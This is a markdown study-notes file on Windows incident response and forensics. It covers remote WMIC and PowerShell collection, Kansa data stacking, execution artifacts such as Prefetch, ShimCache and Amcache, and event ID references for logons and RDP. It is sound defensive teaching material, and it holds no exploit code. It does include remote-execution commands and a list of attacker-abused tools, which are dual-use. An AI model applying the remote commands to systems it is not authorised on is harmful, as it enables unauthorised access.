# Notes on DFIR, Threat Hunting, and Malware Analysis

<br>

- [Incident Response](#incident-response)
  * [Incident Response Process](#incident-response-process)
  * [Incident Response Hierarchy of Needs](#incident-response-hierarchy-of-needs)
  * [Attack Lifecycle](#attack-lifecycle)
  * [IR Scripting](#ir-scripting)
    + [IR Using WMIC](#ir-using-wmic)
    + [IR Using PowerShell](#ir-using-powershell)
    + [Kansa](#kansa)
  * [Kansa Data Stacking Collection and Analysis](#kansa-data-stacking-collection-and-analysis)
    + [Stacking Autoruns](#stacking-autoruns)
    + [Stacking Services](#stacking-services)
    + [Stacking WMI Filters and Consumers](#stacking-wmi-filters-and-consumers)
- [Intrusion Analysis](#intrusion-analysis)
  * [Evidence of Execution](#evidence-of-execution)
    + [Prefetch](#prefetch)
    + [ShimCache - Application Compatibility](#shimcache---application-compatibility)
    + [Amcache.hve - Application Compatibility](#amcachehve---application-compatibility)
    + [Automating and Scaling Execution Analysis](#automating-and-scaling-execution-analysis)
  * [Event Logs Analysis](#event-logs-analysis)
    + [Event Log Summary](#event-log-summary)
    + [Event Log Collection](#event-log-collection)
    + [Location](#location)
    + [Types](#types)
    + [Profiling Account Usage](#profiling-account-usage)
    + [Brute Force Password Attack](#brute-force-password-attack)
    + [Built-In Accounts](#built-in-accounts)
    + [Tracking Administrator Account Activity](#tracking-administrator-account-activity)
    + [Auditing Account Creation](#auditing-account-creation)
    + [Remote Desktop Activity](#remote-desktop-activity)
    + [Account Logon Events](#account-logon-events)
    + [Privileged Local Account Abuse - Pass the Hash](#privileged-local-account-abuse---pass-the-hash)
    + [Account and Group Enumeration](#account-and-group-enumeration)
    + [Event Log Analysis Tools](#event-log-analysis-tools)
    + [Lateral Movement - Network Shares](#lateral-movement---network-shares)
    + [Cobalt Strike Mapping Shares](#cobalt-strike-mapping-shares)
    + [Lateral Movement - Explicit Credentials - runas](#lateral-movement---explicit-credentials---runas)
    + [Lateral Movement - Scheduled Tasks](#lateral-movement---scheduled-tasks)
    + [Suspicious Services](#suspicious-services)
    + [Event Log Clearing](#event-log-clearing)
  * [Lateral Movement Tactics](#lateral-movement-tactics)
    + [RDP - Source System Artifacts](#rdp---source-system-artifacts)
    + [RDP - Destination System Artifacts](#rdp---destination-system-artifacts)
    + [Windows Admin Shares - Source System Artifacts](#windows-admin-shares---source-system-artifacts)
    + [Windows Admin Shares -  Destination System Artifacts](#windows-admin-shares----destination-system-artifacts)
    + [PsExec - Source System Artifacts](#psexec---source-system-artifacts)
    + [PsExec - Destination System Artifacts](#psexec---destination-system-artifacts)
    + [Windows Remote Management Tools](#windows-remote-management-tools)
    + [Remote Services - Source System Artifacts](#remote-services---source-system-artifacts)
    + [Remote Services - Destination System Artifacts](#remote-services---destination-system-artifacts)
    + [Scheduled Tasks - Source System Artifacts](#scheduled-tasks---source-system-artifacts)
    + [Scheduled Tasks - Destination System Artifacts](#scheduled-tasks---destination-system-artifacts)
    + [WMI - Source System Artifacts](#wmi---source-system-artifacts)
    + [WMI - Destination System Artifacts](#wmi---destination-system-artifacts)
    + [Powershell Remoting - Source Sytem Artifacts](#powershell-remoting---source-sytem-artifacts)
    + [Powershell Remoting - Destination Sytem Artifacts](#powershell-remoting---destination-sytem-artifacts)
    + [Application Deployment Software](#application-deployment-software)
    + [Vulnerability Exploitation](#vulnerability-exploitation)
  * [Commandline, PowerShell and WMI Analysis](#commandline--powershell-and-wmi-analysis)
    + [Evidence of Malware Execution](#evidence-of-malware-execution)
    + [Process Tracking and Capturing Command Lines](#process-tracking-and-capturing-command-lines)
    + [WMI](#wmi)
    + [Auditing WMI Peristence](#auditing-wmi-peristence)
    + [Quick Wins - WMI-Activity/Operational Log](#quick-wins---wmi-activity-operational-log)
    + [PowerShell Logging](#powershell-logging)
    + [Quick Wins - PowerShell](#quick-wins---powershell)
    + [PowerShell Transcript Logs](#powershell-transcript-logs)
    + [PSReadline](#psreadline)
- [Memory Forensics](#memory-forensics)
  * [Acquiring Memory](#acquiring-memory)
    + [Live System](#live-system)
    + [Dead System](#dead-system)
    + [Hiberfil.sys](#hiberfilsys)
    + [Virtual Machine Machines](#virtual-machine-machines)
  * [Memory Forensic Process](#memory-forensic-process)
  * [Memory Analysis](#memory-analysis)
  * [Volatility](#volatility)
    + [Image Identification](#image-identification)
  * [Steps to Finding Evil](#steps-to-finding-evil)
  * [Identify Rogue Processes - Step 1](#identify-rogue-processes---step-1)
    + [Procces Analysis](#procces-analysis)
    + [Pslist](#pslist)
    + [Psscan](#psscan)
    + [Pstree](#pstree)
    + [Automating Analysis with Baseline](#automating-analysis-with-baseline)
    + [Rogue Processes Review](#rogue-processes-review)
  * [Memory Forensics - Master Process](#memory-forensics---master-process)
  * [Analyze Process Objects - Step 2](#analyze-process-objects---step-2)
    + [Object Analysis Plugins](#object-analysis-plugins)
    + [dlllist](#dlllist)
    + [getsids](#getsids)
    + [handles](#handles)
    + [Analyzing Process Objects Review](#analyzing-process-objects-review)
  * [Network Artifacts - Step 3](#network-artifacts---step-3)
    + [Plugins](#plugins)
    + [netstat](#netstat)
  * [Evidence of Code Injection - Step 4](#evidence-of-code-injection---step-4)
    + [Code Injection](#code-injection)
    + [Process Hollowing](#process-hollowing)
    + [DLL Injection](#dll-injection)
    + [Code Injection Plugins](#code-injection-plugins)
    + [ldrmodules](#ldrmodules)
    + [Reflective Injection](#reflective-injection)
    + [malfind](#malfind)
    + [malfind Countermeasures](#malfind-countermeasures)
  * [Hooking and Rootkit Detection - Step 5](#hooking-and-rootkit-detection---step-5)
    + [Rootkit Hooking](#rootkit-hooking)
    + [Plugins](#plugins-1)
    + [ssdt](#ssdt)
    + [Direct Kernel Object Manipulation](#direct-kernel-object-manipulation)
    + [psxview](#psxview)
    + [modscan and modules](#modscan-and-modules)
    + [apihooks - Inline DLL Hooking](#apihooks---inline-dll-hooking)
    + [Trampoline Hooking](#trampoline-hooking)
  * [Dump Suspicious Processes and Drivers - Step 6](#dump-suspicious-processes-and-drivers---step-6)
    + [Plugins](#plugins-2)
    + [dlldump](#dlldump)
    + [moddump](#moddump)
    + [procdump](#procdump)
    + [memdump](#memdump)
    + [strings](#strings)
    + [grep](#grep)
    + [cmdscan and consoles](#cmdscan-and-consoles)
    + [Windows 10 Memory Compression](#windows-10-memory-compression)
    + [dumpfiles](#dumpfiles)
    + [filescan](#filescan)
    + [Registry Artifacts - shimcachemem](#registry-artifacts---shimcachemem)
    + [Extracted File Analysis](#extracted-file-analysis)
    + [Live Analysis](#live-analysis)
- [Windows Forensics](#windows-forensics)
  * [SANS Windows Forensic Analysis Poster](#sans-windows-forensic-analysis-poster)
  * [Registy Overview](#registy-overview)
  * [Users and Groups](#users-and-groups)
  * [System Configuration](#system-configuration)
- [Malware Discovery](#malware-discovery)
    + [YARA](#yara)
    + [Sigcheck](#sigcheck)
    + [DensityScout](#densityscout)
    + [capa](#capa)
    + [UPX](#upx)
    + [Putting It All Together](#putting-it-all-together)
  * [Malware Discovery Process](#malware-discovery-process)
    + [yara](#yara)
    + [Sigcheck](#sigcheck-1)
    + [DensityScout](#densityscout-1)
- [Timeline Analysis](#timeline-analysis)
  * [Overview](#overview)
    + [Benefits](#benefits)
    + [Forensic Trinity](#forensic-trinity)
    + [Windows Artifacts](#windows-artifacts)
    + [The Pivot Point](#the-pivot-point)
    + [Contect Clues](#contect-clues)
    + [Timeline Capabilities](#timeline-capabilities)
    + [Analysis Process](#analysis-process)
  * [Filesystem Timeline Creation and Analysis](#filesystem-timeline-creation-and-analysis)
    + [NTFS Timestamps](#ntfs-timestamps)
    + [Timestamp Rules Exceptions](#timestamp-rules-exceptions)
    + [Understanding Timestamps - Lateral Movement Analysis](#understanding-timestamps---lateral-movement-analysis)
    + [Filesystem Timeline Format](#filesystem-timeline-format)
    + [Create Triage Timeline Bodyfile Step 1 - MFTECmd.exe](#create-triage-timeline-bodyfile-step-1---mftecmdexe)
    + [Create Triage Timeline Body File Step 1 - fls](#create-triage-timeline-body-file-step-1---fls)
    + [Create Triage Image Timeline Step 2 - mactime](#create-triage-image-timeline-step-2---mactime)
- [Super Timelines](#super-timelines)
  * [Lateral Movement Example](#lateral-movement-example)
  * [Malware Execution Example](#malware-execution-example)
  * [Process](#process)
  * [log2timeline usage](#log2timeline-usage)
  * [Target Examples](#target-examples)
  * [Targeted Timeline Creation](#targeted-timeline-creation)
  * [Filtering Super Timelines](#filtering-super-timelines)
    + [pinfo.py](#pinfopy)
    + [psort.py](#psortpy)
    + [Case Study: Web Server Intrusion](#case-study--web-server-intrusion)
  * [Super Timeline Analysis](#super-timeline-analysis)
    + [Recommended Columns](#recommended-columns)
    + [Colorize Timeline](#colorize-timeline)
    + [Super Timeline Creation](#super-timeline-creation)
  * [Supertimeline Analysis](#supertimeline-analysis)
    + [Questions to Answer](#questions-to-answer)
    + [Filtering](#filtering)
- [Threat Hunting](#threat-hunting)
  * [Common Malware Names](#common-malware-names)
  * [Common Malware Locations](#common-malware-locations)
  * [Living of the Land Binaries](#living-of-the-land-binaries)
  * [Persitence Locations](#persitence-locations)
    + [Common Autostart Locations](#common-autostart-locations)
    + [Services](#services)
    + [Scheduled Tasks](#scheduled-tasks)
    + [DLL Hijacking](#dll-hijacking)
    + [Hunting DLL Hijacking](#hunting-dll-hijacking)
    + [WMI Event Consumer Backdoors](#wmi-event-consumer-backdoors)
    + [Hunting WMI Persistence](#hunting-wmi-persistence)
    + [Hunt and Analyze Persistence with Autoruns](#hunt-and-analyze-persistence-with-autoruns)
  * [Lateral Movement](#lateral-movement)
    + [Detecting Credential Harvesting](#detecting-credential-harvesting)
    + [Hashes](#hashes)
    + [Credential Availability on Targets](#credential-availability-on-targets)
    + [Tokens](#tokens)
    + [Cached Credentials](#cached-credentials)
    + [LSA Secrets](#lsa-secrets)
    + [Decrypt LSA Secrets with Nishang](#decrypt-lsa-secrets-with-nishang)
    + [Tickets - Kerberos](#tickets---kerberos)
    + [Pass the Ticket with Mimikatz](#pass-the-ticket-with-mimikatz)
    + [Kerberos Attacks](#kerberos-attacks)
    + [NTDS.DIT](#ntdsdit)
    + [Bloodhound - Find a Path to Domain Admin](#bloodhound---find-a-path-to-domain-admin)
- [Misc](#misc)
  * [Decode Base64](#decode-base64)
- [Anti-Forensics](#anti-forensics)
  * [Overview](#overview-1)
    + [Filesystem](#filesystem)
    + [Registry](#registry)
    + [Other](#other)
  * [Recovery of Deleted Files via VSS](#recovery-of-deleted-files-via-vss)
    + [Volume Shadow Copies](#volume-shadow-copies)
    + [Volume Shadow Examination](#volume-shadow-examination)
  * [Advanced NTFS Filesystem Tactics](#advanced-ntfs-filesystem-tactics)
    + [Master File Table - MFT](#master-file-table---mft)
    + [MFT Entry Allocated](#mft-entry-allocated)
    + [MFT Entry Unallocated](#mft-entry-unallocated)
    + [Sequential MFT Entries](#sequential-mft-entries)
    + [istat - Analyzing File System Metadata](#istat---analyzing-file-system-metadata)
    + [Detecting Timestamp Manipulation](#detecting-timestamp-manipulation)
    + [Timestomp Detection](#timestomp-detection)
    + [Analyzing $DATA](#analyzing--data)
    + [Extracting Data with The Sleuth Kit - icat](#extracting-data-with-the-sleuth-kit---icat)
    + [The Zone Identifier ADS -  Evidence of Download](#the-zone-identifier-ads----evidence-of-download)
    + [Filenames](#filenames)
    + [NTFS Directory Attributes](#ntfs-directory-attributes)
    + [Parsing I30 Directory Indexes](#parsing-i30-directory-indexes)
    + [File System Jounraling Overview](#file-system-jounraling-overview)
    + [$LogFile Provides File System Resilience](#-logfile-provides-file-system-resilience)
    + [UsnJrnl](#usnjrnl)
    + [Common Activity Patterns in the Journals](#common-activity-patterns-in-the-journals)
    + [Useful Filter and Searches in the Journals](#useful-filter-and-searches-in-the-journals)
    + [LogFileParser for $LogFile Analysis](#logfileparser-for--logfile-analysis)
    + [MFTECmd for $UsnJrnl Analysis](#mftecmd-for--usnjrnl-analysis)
    + [NTFS: What Happens When a File is Deleted?](#ntfs--what-happens-when-a-file-is-deleted-)
  * [Advanced Evidence Recovery](#advanced-evidence-recovery)
    + [SDelete](#sdelete)
    + [BCWiper](#bcwiper)
    + [Eraser](#eraser)
    + [Cipher](#cipher)
    + [Registry Key/Value "Records" Recovery](#registry-key-value--records--recovery)
    + [Finding Fileless Malware in the Registry](#finding-fileless-malware-in-the-registry)
    + [File Recovery](#file-recovery)
    + [File Recovery via Metadata Method](#file-recovery-via-metadata-method)
    + [File Recovery via Carving Method](#file-recovery-via-carving-method)
    + [Recovering Deleted Volume Shadow Copy Snapshots](#recovering-deleted-volume-shadow-copy-snapshots)
    + [Stream Carving for Event Log and File System Records](#stream-carving-for-event-log-and-file-system-records)
    + [Carving for Strings](#carving-for-strings)
  * [Defensive Coutermeasures](#defensive-coutermeasures)
    + [Leverage File System History](#leverage-file-system-history)
    + [Level Up on Visibility](#level-up-on-visibility)
- [Network Forensics](#network-forensics)

<br>

---

<br>

# Incident Response

## Incident Response Process
1. Preparation
	* Creating a response capability
	* Testing response capabilites
	* Securing Systems
	* Changes to response capabilties from lessons learned
2. Identification and Scoping
	* Alert from security tools
	* Result of threat hunting
	* Notification from user
	* Hunt for additional compromise
3. Containment/Intelligence Development
	* Identify vulnerabilities or exploits
	* Persistence Techniques
	* Lateral Movement
	* Command and Control
	* IOC developement
	* Mitigative actions to slow attacker
4. Eradication/Remediation
	* Block IPs and Domains
	* Restore systems
	* Password changes
	* Vulnerability patching
	* Prevent further adversarial access
	* Remove adversarial presence
5. Recovery
	* Improve logging (SIEM)
	* Cybersecurity Awareness
	* Segmentation
	* Password policies
	* Vulnerability management
	* Network/Endpoint visibility
6. Lessons Learned/Threat Intel Consumption
	* Verify remediations
	* Penetration tests
	* Information sharing
	* Compliance verification

<br>

## Incident Response Hierarchy of Needs
<img alt="Hierarchy with explanations" src="https://raw.githubusercontent.com/swannman/ircapabilities/master/hierarchy.png" />

[Ref: Matt Swann](https://github.com/swannman/ircapabilities)

<br>


## Attack Lifecycle
<img alt="Micosoft's Attack Lifecycle" src="https://docs.microsoft.com/en-us/advanced-threat-analytics/media/attack-kill-chain-small.jpg" />

<br>


## IR Scripting

### IR Using WMIC
- [Running WMI Scripts Against Multiple Computers](https://docs.microsoft.com/en-us/previous-versions/tn-archive/ee692838(v=technet.10))
- [WMIC for incident response](https://www.sans.org/blog/wmic-for-incident-response/)
- [Like a Kid in a WMIC Candy Store](https://isc.sans.edu/diary/Tip+of+the+Day+-+Like+a+Kid+in+a+WMIC+Candy+Store/1622)
- [PoSh-R2](https://github.com/WiredPulse/PoSh-R2)

Examples
```
/node:<remote-IP> | /user:<admin acct>
```
Get Auto-Start Process
```
wmic /node:10.1.1.1 startup list full
```
Remote Process List
```
wmic /node:10.1.1.1 process get
```
Network Configuration
```
wmic /node:10.1.1.1 nicconfig get
```

<br>


### IR Using PowerShell
- [Live Response Using PowerShell](https://www.sans.org/white-papers/34302/)
- [Powershell: Forensic One-liners](https://www.ldap389.info/en/2013/06/17/powershell-forensic-onliners-regex-get-eventlog/)
- [Weekend Scripter: Using PowerShell to Aid in Security Forensics](https://devblogs.microsoft.com/scripting/weekend-scripter-using-powershell-to-aid-in-security-forensics/)
- [Use PowerShell to Perform Offline Analysis of Security Logs](https://devblogs.microsoft.com/scripting/use-powershell-to-perform-offline-analysis-of-security-logs/)
- [Learn the Easy Way to Use PowerShell to Get File Hashes](https://devblogs.microsoft.com/scripting/learn-the-easy-way-to-use-powershell-to-get-file-hashes/)
- [Use PowerShell to Compute MD5 Hashes and Find Changed Files](https://devblogs.microsoft.com/scripting/use-powershell-to-compute-md5-hashes-and-find-changed-files/)

Remoting
```powershell
Enter-PSSession computername
Invoke-Command -ScriptBlock -Filepath -AsJob
```
- [The Power of PowerShell Remoting](https://www.sans.org/blog/the-power-of-powershell-remoting/)
- [Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.1)
- [PowerShell Remoting Performance](https://www.hofferle.com/powershell-remoting-performance/)

Authentication
- Non-interactive (Type 3) logon
- Does not cache creds
- Creds not passed to remote system (Mimikatz, Incognito)

<br>


### Kansa
**Collection**
- [Kansa GitHub](https://github.com/davehull/Kansa)
- Uses PowerShell scripting
- Can remote run executables
- Modules.conf manages what scripts run
- Omit -TargetList and Kansa will query AD for a list of computers and target all of them
	- Requires [Remote Server Administration Tools](https://www.microsoft.com/en-us/download/details.aspx?id=39296)
- -TargetCount limits the total number of systems queried
- -PushBin required by scripts that employ 3rd party binaries (will first copy binaries to targets before running)
- -Rmbin removes binaries after execution  

```powershell
.\kansa.ps1 -OutputPath .\Output\ -TargetList .\hostlist -TargetCount 250 -Verbose -Pushbin
```

**Analysis**
- Can pre-filter and organize data
- Located in the .\Analysis folder
- Uses "stacking" (Least Frequency of Occurence)
- "Meta" scripts loook at indicators like file size
- Example
	- LogParser (LogparserStack.ps1) to stack unsigned Autoruns output from multiple Kansa output files
	- [Computer Forensics How-To: Microsoft Log Parser](https://www.sans.org/blog/computer-forensics-how-to-microsoft-log-parser/)  

**Distributed Kansa**
- Kansa has issues scaling to 1000+ systems
- Fixed with .\DistributedKansa.ps1
- Scripts included to set up distrubted Kansa-Servers
- Modules collect and send data asynchronously to ELK
- [Kansa for Enterprise scale Threat Hunting w/ Jon Ketchum](https://www.youtube.com/watch?v=ZyTbqpc7H-M)
- [Kansa for Enterprise Scale Threat Hunting](https://www.sans.org/presentations/kansa-for-enterprise-scale-threat-hunting/)

**Enable PowerShell Remoting**
- Remoting requires that all network connections be set to something other than "Public." 

1. User ```Get-NetConnectionProfile``` to check
2. If necessary, change it to Private with ```Set-NetConnectionProfile```
```powershell
Set-NetConnectionProfile -InterfaceIndex XX -NetworkCategory Private
```
3. Enable PowerShell Remoting with ```Enable-PSRemoting -force```
4. Run Kansa
```powershell
.\kansa.ps1 -Pushbin -Target computername -Credential SANSDFIR -Authentication Negotiate
```

<br>

## Kansa Data Stacking Collection and Analysis

### Stacking Autoruns

1. Run ```Get-ASEPImagePathLaunchStringStack.ps1``` against autoruns data from workstations and output to csv
```powershell
.\Get-ASEPImagePathLaunchStringMD5UnsignedStack.ps1 >asep-workstation-stack.csv
```

2. Note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "process name" *Autorunsc.csv
```

<br>

### Stacking Services

1. Use ```Get-LogparserStack.ps1``` to perform frequency analysis on services
```powershell
.\Get-LogparserStack.ps1 -FilePattern *SvcAll.csv -Delimiter "," -Direction asc -OutFile SvcAll-workstation-stack.csv
```

2. Script lists names of headers in the CSV files and prompts for which field to count matching values across all files and then which fields to group by (list) in the output.
	- Enter "Name"
	- Name
	- DisplayName
	- PathName
	- Enter "quit" to quit

3. Open the csv output and note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "tbbd05" *SvcAll.csv 
```
<br>

### Stacking WMI Filters and Consumers

1. Use ```Get-LogparserStack.ps1``` to perform frequency analysis on WMI Filters
```powershell
.\Get-LogparserStack.ps1 -FilePattern *WMIEvtFilter.csv -Delimiter "," -Direction asc -OutFile WMIEvtFilter-workstation-stack.csv
```

2. Script lists names of headers in the CSV files and prompts for which field to count matching values across all files and then which fields to group by (list) in the output.
	- Enter "Name"
	- Name
	- Query
	- Enter "quit" to quit

3. Open the csv output and note entries with the least amount of occurences and the associated workstations
```powershell
Select-String "PerformanceMonitor" *WMIEvtFilter.csv
```

4. Search the Kansa WMI Binding output data
```powershell
Select-String "PerformanceMonitor" *ConBind.csv
```

5. Search the Kansa WMI Event Consumer output data
```powershell
Select-String "SystemPerformanceMonitor" *WMIEvtConsumer.csv
```

<br>

---

<br>

# Intrusion Analysis

## Evidence of Execution

### Prefetch
- Evidence of execution
	- Executable name, execution time(s), and execution count
- Limitations: Off by default on servers or workstations with SSDs
- .pf filename (compressed)
	- executable file name followed by dash and hexidecimal representation of a hash of the file's path
- Multiple .pf files with the same executable name can be indicative of two executables with the same name being run from different locations
	- Execeptions: hosting applications (svchost, dllhost, backgroundtaskhost, and rundll32) hash values calculated based off of commandline arguments

**Notes**
- First execution (creation date -10 seconds)
- Last execution (modified date -10 seconds)

**Analysis**
- Can be analyzed with PECmd.exe ```PECmd.exe -d "C:\Windows\Prefetch" --csv "G:\cases" -q```  
- [PECmd](https://github.com/EricZimmerman/PECmd)

<br>

### ShimCache - Application Compatibility
- Available on workstations AND Servers
- Not as easy to delete as Prefetch
- Designed to detect and remediate
- Different compatibility modes are called shims
- Tracks Name, File Path, and Last Modification Time of executable
- Executables can be added to the regirsty regradless if they've been executed
	- Executable viewed via Windows GUI apps
- After XP, ShimCache no longer include execution time
- Win7 & 8/8.1 include execution flags (Win 10 does not)
	- InsertFlag = True (App Executed)

**Win 7+**  

```
SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache\AppCompatCache
```  

- Server 2003 = 512 Entries
- Win7-10, Server 2008-2019 = 1024 Entries

**Win XP**

```
SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatibility\AppCompatCache
```  

- 96 entries

**Notes**
- Most recent activities are on the top
- New entries are only written on shutdown (only exist in memory before)
- Each "ControlSet" can have its own ShimCache database
- If the executable is modified (content changes) or renamed, it will be shimmed again
- [Leveraging the Application Compatibility Cache in Forensic Investigations](https://web.archive.org/web/20190209113245/https://www.fireeye.com/content/dam/fireeye-www/services/freeware/shimcache-whitepaper.pdf)

**Analysis**
- [AppCompatCacheParser](https://github.com/EricZimmerman/AppCompatCacheParser)

```
.\AppCompactCacheParser.exe -f .\SYSTEM --csv c:\temp
```
- Written in order of excecution or GUI discovery
- Additional tool from Mandiant: [ShimCacheParser](https://github.com/mandiant/ShimCacheParser)

<br>

### Amcache.hve - Application Compatibility
```
C:\Windows\AppCompat\Programs\Amcache.hve
```
- Win7+
- Tracks installed applications, loaded drivers, and unassociated excectuables
- Full path, file size, file modification time, compilation time, publisher metadata
- SHA1 hashes of executables and drivers
- Entries can be due to file discovery or installation and not always execution
- [ANALYSIS OF THE AMCACHE](https://www.ssi.gouv.fr/uploads/2019/01/anssi-coriin_2019-analysis_amcache.pdf)

**Analysis**
- InventoryApplicationFile
	- FileId: SHA1 Hash
	- LinkDate: PE Header Compilation Time
	- LowerCaseLongPath: Full Path
	- ProgramId: Cross-Ref with InventoryApplication key for more info
		- Unassociated (not installed) applications dont have a ProgramId
		- Malware often does not go through the installation process
	- Size: File Size
- InventoryApplication
	- Installed Application
	- Provides Installation Date
	- Publisher information
- InventoryDriverBinary
	- Keys contain file path of driver
	- DriverId: SHA1 Hash
	- DriverLastWriteTime: Modification Time of Driver
	- DriverSigned: 1 = signed
	- Product/ProductVersion = Driver Metadata
	- Rootkits are often heavily reliant on drivers
	- Most drivers in ```C:\Windows\system32\drivers\```

- Can be parsed with [AmCacheParser](https://github.com/EricZimmerman/AmcacheParser)
```
amcacheparser.exe -i -f amcache.hve --csv G:\<folder>
```
- Leverages allowlisting and blocklisting based on SHA1

<br>

### Automating and Scaling Execution Analysis
- Malware 101
	- One/two letter executables
	- Executions from temp ro $Recycle.Bin folders
- Common Tools
	- psexec.exe
	- wmic.exe
	- scrcons.exe
	- certutil.exe
	- rar.exe
	- wsmprovhost.exe
	- whoami.exe
	- schtasks.exe
- IOCs
	- Known Malware
	- Tools
	- Staging directories

**[appcompatprocessor.py](https://github.com/mbevilacqua/appcompatprocessor)**
- Performs scalable hunting of ShimCache and Amcache artifacts
- Regex Searches + built library of common anomalies
- "Reconscan" to search for grouping of known recon tools
- [ShimCache and AmCache Enterprise-wide Hunting](https://github.com/mbevilacqua/appcompatprocessor)
- Temporal correlations of execution activity

Perform a search against built-in signatures
```
AppCompatProcessor.py database.db search
```

Perform least frequency of occurence analysis
```
AppCompatProcessor.py database.db stack "FilePath" "FileName" LIKE '%svchost.exe'"
```

<br>

## Event Logs Analysis

<br>

### Event Log Summary

| **Activity** | **Event Log** | **EID** |
| :---------------: | :---------------: | :---------------: |
|Logons|Security|4624, 4625, 4634, 4647, <br> 4648, 4769, 4771, 4776|
|Account Logon|Security|4678, 4769, 4771, 4776|
|RDP|Security <br> RDPCoreTS <br> Terminal Services-RemoteConnectionManager|4624, 4625, 4778, 4779 <br> 131 <br> 1149|
|Network Shares|Security|5140-5145|
|Scheduled Tasks|Security <br> Task Scheduler|4698 <br> 106, 140-141, 200-201|
|Installation|Application|1033, 1034, 11707, 11708, 11724|
|Services|System <br> Security|7034-7036, 7040, 7045 <br> 4697|
|Log Clearing|Security <br> System|1102 <br> 104|
|Malware Execution|Security <br> System <br> Application|4688 <br> 1001 <br> 1000-1002|
|CommandLines|Security <br> PowerShell-Operational|4688 <br> 4103-4104|
|WMI|WMI-Activity-Operational|5857-5861|

<br>

### Event Log Collection
**Live System Collection**
- Export from Event Viewer
- PsLogList (Sysinternals)
- Kape, Kansa, Velociraptor
- PowerShell

**PowerShell**
- Remote: ```Get-WinEvent -ComputerName```  
- Local: ```Get-WinEvent -Logname```
- Archived: ```Get-WinEvent -Path```

**Example**
```powershell
Get-WinEvent -FilterHashtable
@{Logname="Security"; id=4624} | where
{$_.Message -match "w00d33"}
```

<br>

```powershell
Get-WinEvent -FilterHashtable
@{Path="C:\Path-To-Exported\Security*.evtx"
;id=5140} | Where {$_.Message -match "\\Admin\$"}
```

<br>

### Location
- Server 2003 and older
	- %systemroot%\System32\config
	- .evt
- Vista and newer
	- %systemroot%\System32\winevt\logs
	- .evtx

<br>

### Types

**Security**
- Records access control and security settings
- Events based on audit and group policies
- Example: Failed logon; folder access
- User authentication
- User behavior and actions
- File/Folder/Share access

**System**
- Contains events related to Windows services, system components, drivers, resources, etc.
- Example: Service stopped; system rebooted

**Application**
- Software events unrealted to operating system
- Example: SQL server fails to access database

**Other**
- Task Scheduler
- Terminal Services
- Powershell
- WMI
- Firewall
- DNS (Servers)

<br>

### Profiling Account Usage
- Determine which accounts have been used for attempted logons
- Track account usage for known compromised accounts

**Event IDs**
- 4624: Successful Logon
- 4625: Failed Logon
- 4634/4647: Successful Logoff
- 4648: Logon using explicit credentials (RunAs)
- 4672: Account logon with superuser rights (Administrator)
- 4720/4726: An account was created/deleted

**Notes**
- Windows does not reliably record logoffs, also look for 4647 -> user initiated logoff for interactive logons
- Logon events are not recorded when backdoors, remote exploits, or similar malicous means are used to access a system

**Logon Types**  
2: Logon via console (keyboard, server KVM, or virtual client)  
3: Network logon (SMB and some RDP connections)  
4: Batch Logon -- Often used by Scheduled tasks  
5: Windows Service Logon  
7: Credentials used to lock or unlock screen; RDP session reconnect  
8: Network logon sending credentials in cleartext  
9: Different credentials used than logged on user -- RunAs/netonly  
10: Remote interactive login (Remote Desktop Protocol)  
11: Cached credentials used to log on  
12: Cached Remote Interactive (similar to Type 10)  
13: Cached unlock (similar to Type 7)  
Ref: [Logon Type Codes Revealed](https://techgenix.com/Logon-Types/)

**Identify Logon Sessions**
- Use Logon ID value to link a logon with a logoff and determine session length
- Useful for interactive logons (Type 2, 10, 11, 12)
- Can tie togther actions like special user privileges assigned to the session, process tracking, and object access
- Admin logins generate two different sessions
	- high privilege session
	- lower privlege session

<br>

### Brute Force Password Attack
- Logon Type 3 - Could SMB or RDP
- 1 accounts and many passwords = password guessing attack
- many accounts and few passwords = password spraying attack
- [Failed Login Codes](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625)

<br>

### Built-In Accounts

- SYSTEM
	- Most powerful local account; unlimited access to system

- LOCAL SERVICE
	- Limited privileges similar to authenticated user account; can access only network resources via null session

- NETWORK SERVICE
	- Slightly higher privileges that LOCAL SERVICE; can access network resouces similar to authenticated user account

- HOSTNAME$
	- Every domain-joined windows system has a computer account

- DWM
	- Desktop window manager\Window manager group

- UMFD
	- Font driver host account

- ANONYMOUS LOGON
	- Null session w/o credentials use to authenticate with resource

**Notes**  
- Recommended to ignore in initial investigation (very noisy)

<br>

### Tracking Administrator Account Activity

- Event ID 4672
- Usually follows Event ID 4624 (Successful Logon)
- Important for:
	- Account auditing
	- Planning for password resets
	- Identifying compromised service accounts
- Scheduled tasks run with administrative privileges also trigger this

<br>

### Auditing Account Creation

- Event ID 4720
- Complementary events include
	- 4722: A user account was enabled
	- 4724: An attempt was made to reset an accounts password
	- 4728: A member was added to a security enabled global group
	- 4732: A member was added to a security enabled local group
	- 4735: A security enabled local group was changed
	- 4738: A user account was changed
	- 4756: A member was added to a security enabled universal group

<br>

### Remote Desktop Activity

- Event ID 4778 (Session Reconnected)
	- Should see 4624 (Successful logon) simultaneously
	- Session name contains "RDP"
	- Client Name: True Client Hostname (regardless of hops)
- Event ID 4779 (Session Disconnected)
	- Should see 4647 (Successful logoff) simultaneously
- Not a reliable indicator of all RDP activity (records reconnects)
	- Fill in gaps with Event ID 4624 Type 3,7,10 Events
- Logs provide IP address and hostname
- False positive: Shared workstations (fast user switching)
	- Session Name: Console
- Source System
	- Security
		- 4648: Logon with alternate credentials
			- Current logged on username
			- Alternate user name
			- Destination hostname/ip
			- Process Name
	- TerminalServices-RdpClient
		- 1024
			- Destination hostname
		- 1102
			- Destination IP
- Destination System
	- Security
		- 4624 Type 10
			- Source IP/Logon Username
		4778/4779
			- IP address of source/source system name
			- Logon Username
	- Remote Desktop Services-RDPCoreTS
		- 131 - Connection attempts
			- Source ip/logon username
		- 98 - Successful connections
	- TerminalServices Remote Connection Manager
		- 1149
			- Source ip/logon user name
				- Blank may indicate use of sticky keys
	- Terminal Services LocalSession Manager
		- 21,22,25
			- Source IP, Logon username
		- 41
			- Logon Username
- 4624 Type 7
	- Often Unlock or RDP Reconnect

<br>

### Account Logon Events

- Different than logon events
- Recorded on system that authenticated credentials
	- Local Account/Workgroup = on workstation
	- Domain/Active Directory = on domain controller  

- Event ID codes (NTLM)
	- 4776: Successful/Failed account authentication  

- Event ID codes (Kerberos protocol)
	- 4768: TGT was granted (successful logon)
